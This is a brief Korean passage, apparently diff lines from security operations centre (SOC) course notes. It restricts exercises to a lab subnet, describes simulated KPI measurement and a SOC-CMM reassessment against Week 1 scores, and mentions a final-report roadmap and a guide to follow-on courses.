+(10.20.30.0/24) 에서만, 운영 환경 미적용. KPI 측정은 시뮬 결과 — 실 운영은 정기 측정.
+SOC-CMM 재평가는 Week 1 점수와 비교 → 객관적 성장 측정. 최종 보고서에 향후 로드맵 포함 —
+다음 과정 (course13 / course15 / course17) 선택 가이드.
